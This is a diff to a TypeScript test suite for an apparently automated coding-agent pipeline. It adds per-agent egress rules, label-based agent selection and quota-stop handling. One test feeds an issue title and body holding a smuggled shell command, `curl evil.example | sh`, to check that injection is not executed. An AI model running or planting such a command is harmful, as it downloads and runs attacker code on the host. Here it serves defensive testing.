@@ -79,8 +79,14 @@ beforeEach(() => {
   githubApi.pulls = []
 })
 
+/** What a real agent's harness contributes: the rule that signs its calls. */
+const agentEgress = async () => [
+  { domain: 'api.anthropic.com', headers: { 'x-api-key': ANTHROPIC } },
+]
+
 const okHarness: CodingHarness = {
   name: 'fake-agent',
+  egress: agentEgress,
   run: async () => ({ ok: true, summary: 'added truncate', costUsd: 0.12 }),
 }
 
@@ -91,13 +97,13 @@ function deps(sandbox: FakeSandbox, overrides: Partial<RunTaskDeps> = {}): RunTa
     githubApi,
     sandbox,
     harness: okHarness,
-    claude: { kind: 'api-key', secret: ANTHROPIC },
     pushRetryDelayMs: 0,
     author: { name: 'aifactory[bot]', email: 'bot@users.noreply.github.com' },
     fetchIssue: async () => ({
       number: 7,
       title: 'Add truncate',
       body: 'Write truncate(text, max).',
+      labels: [],
     }),
     ...overrides,
   }
@@ -177,6 +183,7 @@ describe('runTask', () => {
     const id = await seedTask()
     const liar: CodingHarness = {
       name: 'liar',
+      egress: agentEgress,
       run: async () => ({ ok: true, summary: 'All tests pass, ready to merge.', costUsd: 0.1 }),
     }
     const sandbox = new FakeSandbox(
@@ -265,7 +272,9 @@ describe('runTask', () => {
     const sandbox = new FakeSandbox(changed())
     const evil = `x'; curl evil.example | sh; echo '`
     await runTask(
-      deps(sandbox, { fetchIssue: async () => ({ number: 7, title: evil, body: evil }) }),
+      deps(sandbox, {
+        fetchIssue: async () => ({ number: 7, title: evil, body: evil, labels: [] }),
+      }),
       id,
     )
 
@@ -292,6 +301,7 @@ describe('runTask', () => {
     const sandbox = new FakeSandbox(changed())
     const failing: CodingHarness = {
       name: 'f',
+      egress: agentEgress,
       run: async () => ({ ok: false, summary: 'Invalid API key' }),
     }
 
@@ -349,6 +359,7 @@ describe('runTask', () => {
     const sandbox = new FakeSandbox(changed())
     const slowAgent: CodingHarness = {
       name: 'slow',
+      egress: agentEgress,
       run: async () => {
         abort.abort() // the lease runs out while the agent works
         throw new Error('command killed')
@@ -427,6 +438,98 @@ describe('runTask', () => {
     expect(result).toMatchObject({ status: 'failed', stage: 'push' })
     expect(pushes).toBe(3)
     expect(result.status === 'failed' && result.error).toContain('permission denied')
+  })
+
+  it('runs the agent the issue asks for, prepares it, and gives the firewall its rule', async () => {
+    const id = await seedTask()
+    const sandbox = new FakeSandbox(changed())
+    const calls: string[] = []
+    const other: CodingHarness = {
+      name: 'codex',
+      egress: async () => [
+        { domain: 'chatgpt.com', headers: { authorization: 'Bearer codex-token' } },
+      ],
+      prepare: async () => void calls.push('prepare'),
+      run: async () => {
+        calls.push('run')
+        return { ok: true, summary: 'done by codex', sessionId: 'sess-1' }
+      },
+    }
+    const asked: string[][] = []
+
+    const result = await runTask(
+      deps(sandbox, {
+        fetchIssue: async () => ({
+          number: 7,
+          title: 'T',
+          body: 'B',
+          labels: ['factory', 'harness:codex'],
+        }),
+        harness: (labels) => (asked.push(labels), other),
+      }),
+      id,
+    )
+
+    expect(result).toMatchObject({ status: 'done' })
+    expect(asked).toEqual([['factory', 'harness:codex']])
+    expect(calls).toEqual(['prepare', 'run'])
+    const byDomain = Object.fromEntries(sandbox.specs[0].egress.map((r) => [r.domain, r.headers]))
+    expect(byDomain['chatgpt.com']).toEqual({ authorization: 'Bearer codex-token' })
+    expect(byDomain['api.anthropic.com']).toBeUndefined()
+    const build = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'build')))[0]
+    expect(build.detail).toMatchObject({ harness: 'codex' })
+    const push = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'push')))[0]
+    expect(push.detail).toMatchObject({ sessionId: 'sess-1' })
+  })
+
+  it('fails before any sandbox when the issue asks for an agent that does not exist', async () => {
+    const id = await seedTask()
+    const sandbox = new FakeSandbox(changed())
+
+    const result = await runTask(
+      deps(sandbox, {
+        fetchIssue: async () => ({ number: 7, title: 'T', body: 'B', labels: ['harness:gemini'] }),
+        harness: () => {
+          throw new Error('unknown agent "gemini" (known: claude-code, codex)')
+        },
+      }),
+      id,
+    )
+
+    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
+    expect(result.status === 'failed' && result.error).toContain('unknown agent "gemini"')
+    expect(sandbox.specs).toHaveLength(0)
+  })
+
+  it('records a quota stop as a wait with its reset time, and opens nothing', async () => {
+    const id = await seedTask()
+    const quota: CodingHarness = {
+      name: 'codex',
+      egress: agentEgress,
+      run: async () => ({
+        ok: false,
+        summary: 'codex failed: usage limit',
+        quota: { message: 'You hit your usage limit', resetsAt: 'Nov 5th, 2026 11:48 AM' },
+      }),
+    }
+    const sandbox = new FakeSandbox(changed())
+
+    const result = await runTask(deps(sandbox, { harness: quota }), id)
+
+    expect(result).toMatchObject({ status: 'failed', stage: 'build' })
+    expect(result.status === 'failed' && result.error).toContain(
+      'codex quota ran out, resets Nov 5th',
+    )
+    const failed = (
+      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
+    )[0]
+    expect(failed.detail).toMatchObject({
+      failedAt: 'build',
+      quota: true,
+      resetsAt: 'Nov 5th, 2026 11:48 AM',
+    })
+    expect(githubApi.pulls).toEqual([])
+    expect(sandbox.stopped).toBe(1)
   })
 
   it('throws for a task that does not exist', async () => {
